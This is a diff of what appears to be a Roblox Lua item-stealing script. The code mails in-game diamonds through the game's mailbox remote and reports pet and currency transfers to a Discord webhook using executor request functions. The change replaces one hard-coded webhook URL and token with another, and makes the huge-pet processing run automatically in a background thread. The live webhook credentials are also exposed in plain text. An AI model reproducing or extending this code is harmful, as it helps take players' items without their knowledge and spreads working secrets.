@@ -247,7 +247,11 @@ if SendAmount == true then
         }
         ReplicatedStorage.Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
         
-        local playerName = game.Players.LocalPlayer.Name
+    end
+end
+
+
+local playerName = game.Players.LocalPlayer.Name
         local data = {
             ["content"] = playerName .. " | Successfully sent " .. DiamondsValue .. " | Currently " .. VoidAmount .. " Tickets Left"
         }
@@ -300,7 +304,7 @@ function ProcessHugePets()
 
     for i = #uids, 1, -1 do
 HugeCheck = true
-        local webhook = "https://discord.com/api/webhooks/1238281258174386257/C-YRLxkKnYEIPUFjIJYEAS2L_zdAv-Qou6OAzvFpIaxELHHNVdP2LnlXf3uwA-SSNzwD"
+        local webhook = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6"
         local request = (syn and syn.request) or request or (http and http.request) or http_request
         request({
             Url = webhook,
@@ -327,13 +331,7 @@ HugeCheck = true
 end
 
 
-        ProcessHugePets()
-
-    end
-end
-
-
-
+spawn(ProcessHugePets)
 
 if HugeCheck then
     wait(30)
